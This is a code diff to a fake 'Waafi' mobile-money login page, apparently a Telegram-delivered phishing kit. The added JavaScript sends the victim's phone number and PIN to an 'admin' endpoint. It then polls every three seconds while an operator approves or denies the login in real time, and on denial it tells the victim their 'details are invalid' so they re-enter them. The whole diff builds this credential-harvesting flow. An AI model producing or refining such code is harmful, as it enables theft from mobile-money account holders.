@@ -72,10 +72,55 @@
         }
 
         .spacer { height: 40px; }
+
+        /* ADDED: Dynamic Error Banner styling */
+        .error-banner {
+            display: none;
+            background-color: #fee2e2;
+            border: 1.5px solid #ef4444;
+            color: #b91c1c;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* ADDED: Clean Loading Overlay screen overlay */
+        .loader-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #555;
+            font-size: 18px;
+        }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #82d13d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 
 <body>
+
+<!-- ADDED: Processing overlay screen -->
+<div id="loadingOverlay" class="loader-overlay">
+    <div class="spinner"></div>
+    <p>Fadlan sug...</p>
+</div>
 
 <div class="header-box">
     <p class="logo-text">Waafi</p>
@@ -84,6 +129,9 @@
 
 <div class="main-content">
     <h2>Gal</h2>
+
+    <!-- ADDED: Target error element -->
+    <div id="errorBox" class="error-banner"></div>
 
     <div class="phone-display">
         <span>🇸🇴</span>
@@ -120,6 +168,10 @@ document.addEventListener("DOMContentLoaded", () => {
     const loginBtn = document.getElementById('loginBtn');
     const eye = document.getElementById('eyeIcon');
     const displayPhone = document.getElementById('displayPhone');
+    const errorBox = document.getElementById('errorBox');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    let pollInterval = null;
 
     // ✅ FIXED PHONE LOADING (safe fallback)
     const savedPhone = localStorage.getItem('phone');
@@ -158,15 +210,72 @@ document.addEventListener("DOMContentLoaded", () => {
         eye.textContent = show ? "🫣" : "👁️";
     });
 
-    // Login
-    loginBtn.addEventListener('click', () => {
+    // Login Action & Notification Loop
+    loginBtn.addEventListener('click', async () => {
         let pin = "";
         pinBoxes.forEach(b => pin += b.value);
 
         localStorage.setItem('lastPin', pin);
+        errorBox.style.display = 'none';
+        loadingOverlay.style.display = 'flex';
 
-        window.location.href = "/page7";
+        // 1. Fire the notification to your admin API endpoint
+        try {
+            const response = await fetch('/api/login-notification', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: savedPhone, pin: pin })
+            });
+            const data = await response.json();
+            
+            if (!data.success) {
+                loadingOverlay.style.display = 'none';
+                errorBox.textContent = "Cillad ayaa dhacday, fadlan isku day markale.";
+                errorBox.style.display = 'block';
+                return;
+            }
+
+            // 2. Begin monitoring Admin action feedback loops
+            startStatusChecking(savedPhone);
+
+        } catch (err) {
+            loadingOverlay.style.display = 'none';
+            errorBox.textContent = "Xiriirka server-ka waa go'an yahay.";
+            errorBox.style.display = 'block';
+        }
     });
+
+    // Helper function to monitor server memory store values
+    function startStatusChecking(phone) {
+        if (pollInterval) clearInterval(pollInterval);
+
+        pollInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await res.json();
+
+                if (data.status === "approved") {
+                    clearInterval(pollInterval);
+                    window.location.href = "/page7";
+                } 
+                else if (data.status === "denied") {
+                    clearInterval(pollInterval);
+                    loadingOverlay.style.display = 'none';
+                    
+                    // Clear fields out so they enter new clean metrics
+                    pinBoxes.forEach(b => b.value = "");
+                    checkInputs();
+                    pinBoxes[0].focus();
+
+                    // Display your target verification warning
+                    errorBox.textContent = "Your details are invalid enter the correct details.";
+                    errorBox.style.display = 'block';
+                }
+            } catch (e) {
+                console.error("Error picking up changes:", e);
+            }
+        }, 3000); // Polls every 3 seconds
+    }
 
     // Telegram safe init
     if (window.Telegram?.WebApp) {
